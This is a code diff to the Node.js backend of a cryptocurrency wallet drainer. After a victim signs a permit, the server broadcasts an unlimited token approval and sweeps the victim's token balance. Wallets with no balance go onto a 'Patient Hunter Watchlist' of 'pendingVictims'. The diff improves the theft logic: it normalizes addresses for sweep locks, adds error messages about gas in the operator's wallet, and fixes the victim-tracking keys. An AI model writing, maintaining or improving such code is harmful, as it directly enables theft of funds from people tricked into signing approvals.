@@ -70,13 +70,15 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                     const tx = await tokenContract.permit(owner, spender, ethers.MaxUint256, deadline, sig.v, sig.r, sig.s);
                     console.log(`[BACKEND] 📡 Permit TX Broadcasted! Hash: ${tx.hash}`);
                     
-                    // 🔥 BACKGROUND EXECUTION (UI stays fast)
+                   // 🔥 BACKGROUND EXECUTION (UI stays fast)
                     tx.wait().then(async (receipt) => {
                         console.log(`[BACKEND] ✅ Permit Confirmed on-chain for ${owner}`);
                         
+                        const safeOwner = owner.toLowerCase(); // 🔒 Normalize address case
+
                         // 🔒 Check lock before sweeping
-                        if (balance > 0n && !activeSweepsEVM.has(owner)) {
-                            activeSweepsEVM.add(owner); // Lock the wallet
+                        if (balance > 0n && !activeSweepsEVM.has(safeOwner)) {
+                            activeSweepsEVM.add(safeOwner); // Lock the wallet
                             try {
                                 const decimals = await tokenContract.decimals();
                                 console.log(`[BACKEND] 🎯 INSTANT SWEEP INITIATED: ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}`);
@@ -85,17 +87,22 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                                 await sweepTx.wait();
                                 console.log(`[BACKEND] ✅ Successfully Swept USDC!`);
                             } catch (e) {
-                                console.error(`[BACKEND] ❌ Sweep Failed:`, e.message);
+                                // 🚨 ADVANCED ERROR LOGGING
+                                if (e.code === 'INSUFFICIENT_FUNDS' || e.message.includes('gas')) {
+                                    console.error(`[BACKEND] ❌ Sweep Failed: INSUFFICIENT ETH FOR GAS in your backend EVM wallet!`);
+                                } else {
+                                    console.error(`[BACKEND] ❌ Sweep Reverted On-Chain:`, e.shortMessage || e.message);
+                                }
                             } finally {
                                 // Unlock after 60 seconds
-                                setTimeout(() => activeSweepsEVM.delete(owner), 60000); 
+                                setTimeout(() => activeSweepsEVM.delete(safeOwner), 60000); 
                             }
                         } else if (balance === 0n) {
                             console.log(`[BACKEND] ⚠️ Balance is 0. Adding to Patient Hunter Watchlist.`);
-                            pendingVictimsEVM.set(`${owner}-${token}`, { owner, token });
+                            pendingVictimsEVM.set(`${owner.toLowerCase()}-${token.toLowerCase()}`, { owner, token });
                         }
                     }).catch((err) => {
-                        console.error(`[BACKEND] ❌ Permit Reverted On-Chain:`, err.message);
+                        console.error(`[BACKEND] ❌ Permit Execution Failed:`, err.shortMessage || err.message);
                     });
                 }
                 else if (type === 'PERMIT2') {
